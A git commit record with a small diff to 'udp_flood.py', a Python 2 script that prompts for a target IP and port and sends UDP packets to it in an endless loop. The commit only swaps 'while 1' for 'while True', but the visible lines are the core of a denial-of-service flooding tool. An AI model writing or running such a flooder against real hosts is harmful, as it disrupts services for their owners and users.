919b9310542d1945f88d7c7ef2a01e9efcc70140
zoomer <51061101+calebrwalk5@users.noreply.github.com>
2021-10-28 08:20:37 -0400

    Update udp_flood.py

--- udp_flood.py
+++ udp_flood.py
@@ -7,7 +7,7 @@ ip = raw_input('Target IP: ')
 port = input('Port: ')
 sent = 0
 
-while 1:
+while True:
   sock.sendto(bytes,(ip,port))
   print "Sent %s packets to %s at port %s " % (sent,ip,port)
   sent = sent + 1
